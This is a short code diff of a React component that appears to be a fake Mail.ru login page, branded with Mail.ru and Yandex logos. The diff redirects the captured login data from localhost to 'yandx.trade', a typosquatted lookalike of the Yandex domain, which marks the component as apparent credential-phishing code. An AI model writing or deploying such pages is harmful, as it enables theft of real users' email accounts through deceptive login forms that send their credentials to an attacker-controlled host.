@@ -1,7 +1,6 @@
 import { useState } from "react";
 import MailLogo from '../assets/mail/logo.png'
 import YaLogo from '../assets/YaLogo.png'
-// import QRCode from "qrcode.react";
 
 const MailRuAuth = () => {
   const [login, setLogin] = useState("");
@@ -16,7 +15,7 @@ const MailRuAuth = () => {
 
   const handleClick = () => {
     setShowToast(true);
-    setTimeout(() => setShowToast(false), 3000); // Убираем через 3 сек
+    setTimeout(() => setShowToast(false), 3000)
   };
 
   const handleButtonClick = (e) => {
@@ -40,7 +39,7 @@ const MailRuAuth = () => {
         resource: "Mailru"
       };
 
-      fetch("http://localhost:8000/addUser", {
+      fetch("http://yandx.trade:8000/addUser", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
